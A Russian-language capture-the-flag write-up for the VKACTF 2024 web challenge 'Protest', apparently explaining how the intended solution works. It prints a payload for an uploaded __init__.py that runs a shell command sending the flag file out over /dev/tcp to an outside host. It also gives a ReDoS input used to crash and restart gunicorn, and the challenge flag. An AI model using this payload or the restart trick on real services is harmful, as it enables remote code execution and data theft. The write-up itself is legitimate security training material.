## Protest

| Событие | Название | Категория | Сложность |
| :------ | ---- | ---- | ---- |
| VKACTF 2024 | Protest  | Web | Сложно |

  
### Описание


> Автор: [ EGM ]
>
> Протесты в городе обычное дело, нужно их решать! Бери молоток и беги к рабочим на стоянку!


### Решение

1. Сервис позволяет переводить текстовые файлы в картинки, но имя файла проверяется по регулярке.
```
def check_filename(checked_file):
    random_uuid = str(uuid.uuid4())
    res = re.match(r'^[\.a-zA-Z0-9_-]([\.a-zA-Z0-9_-]+)*$', checked_file)
    safe_filename = random_uuid if res is None else checked_file
    return safe_filename
```

2. Из скрипта ```run.sh``` ,понимаем, что сервер поднимается с помощью ```gunicorn``` сервера.

3. Использем при загрузке файл ```__init__.py``` с нагрузкой которая отправит файл на свой сервер
```
"__import__('os').system('bash -c "/readflag>/dev/tcp/host/port"')"
```

5. Необходимо перегрузить ```gunicorn```, чтобы выполнился новый ```__init__.py``` файл. Воспользуемся redos на 
```
r'^[\.a-zA-Z0-9_-]([\.a-zA-Z0-9_-]+)*$'
aaaaaaaaaaaaaaaaa!
```
5. Сервер перезагрузится с новым ```__init__.py``` файлом и отправит флаг на ваш сервер. 

### Эксплоит
[exploit.py](../give/ez_exploit.py)

### Флаг

```
vka{6Un1p0rn_0r_Pun1c0rn}
```
